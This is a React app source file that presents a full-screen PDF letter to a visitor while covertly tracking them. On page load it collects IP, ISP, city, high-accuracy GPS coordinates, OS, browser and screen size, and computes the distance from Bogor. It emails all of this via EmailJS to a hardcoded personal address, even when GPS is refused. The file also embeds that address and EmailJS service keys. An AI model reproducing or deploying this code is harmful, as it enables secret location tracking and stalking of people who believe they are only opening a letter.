import React, { useEffect, useRef } from 'react';
import useGetIP from './hooks/useGetIP';
import useGetDeviceInfo from './hooks/useGetDeviceInfo';
import haversine from 'haversine-distance';
import emailjs from '@emailjs/browser';
import suratNova from './assets/surat-nova.pdf';

const BOGOR_COORDS = { latitude: -6.5971, longitude: 106.7949 };

function App() {
  const { data: ipData, loading } = useGetIP();
  const { detectOS, detectBrowser, screenSize } = useGetDeviceInfo();
  const hasSent = useRef(false);

  useEffect(() => {
    // TRIGGER: Jika loading sudah false (selesai fetch, baik sukses/gagal)
    // dan email belum pernah terkirim di sesi ini.
    if (!loading && !hasSent.current) {
      handleHybridTracking();
    }
  }, [loading]);

  const handleHybridTracking = () => {
    if (hasSent.current) return;

    // Coba minta akses GPS
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendEmail(pos.coords.latitude, pos.coords.longitude, "GPS Diberikan");
        },
        (err) => {
          // Tetap kirim email meski GPS ditolak user
          sendEmail(null, null, `GPS Ditolak/Error: ${err.message}`);
        },
        { enableHighAccuracy: true, timeout: 5000 }
      );
    } else {
      sendEmail(null, null, "Browser Tidak Support GPS");
    }
  };

  const sendEmail = async (gpsLat, gpsLon, gpsStatus) => {
    try {
      // Ambil koordinat dari IP jika ada, jika tidak set ke 0
      const ispLat = ipData?.lat || 0;
      const ispLon = ipData?.lon || 0;

      // Tentukan koordinat terbaik untuk menghitung jarak
      const finalLat = gpsLat || ispLat;
      const finalLon = gpsLon || ispLon;
      
      let distanceText = "Tidak dapat menghitung jarak";
      if (finalLat !== 0) {
        const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);
        distanceText = `${distance} km`;
      }

      const templateParams = {
        to_email: 'suhilman@bignet.id',
        ip_address: ipData?.ip || 'Gagal Mendapatkan IP', 
        isp: ipData?.isp || 'Unknown ISP', 
        as_name: ipData?.asn || 'N/A', 
        isp_lat_long: ispLat !== 0 ? `${ispLat},${ispLon}` : "N/A",
        gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : "N/A",
        location_detail: ipData 
          ? `${ipData.city || ''}, ${ipData.regionName || ''}, ${ipData.country || ''}`
          : "Detail lokasi IP tidak tersedia",
        distance_from_bogor: distanceText,
        device_os: detectOS(),
        browser: detectBrowser(),
        screen_res: `${screenSize.width}x${screenSize.height}`,
        current_time: new Date().toLocaleString('id-ID'),
        gps_status: gpsStatus 
      };

      await emailjs.send(
        'service_rjl2ja4', 
        'template_iruemib', 
        templateParams, 
        'ZoURH59lMids8g1rT'
      );
      
      hasSent.current = true;
      console.log("Tracking berhasil dikirim.");
    } catch (err) {
      console.error('EmailJS Error:', err);
    }
  };

  return (
    <div style={{ height: '100vh', margin: 0, padding: 0, overflow: 'hidden', backgroundColor: '#000' }}>
      {/* Menampilkan PDF secara Full Screen */}
      <iframe
        src={`${suratNova}#toolbar=0&navpanes=0`} 
        title="Surat"
        style={{ width: '100%', height: '100%', border: 'none' }}
      />
    </div>
  );
}

export default App;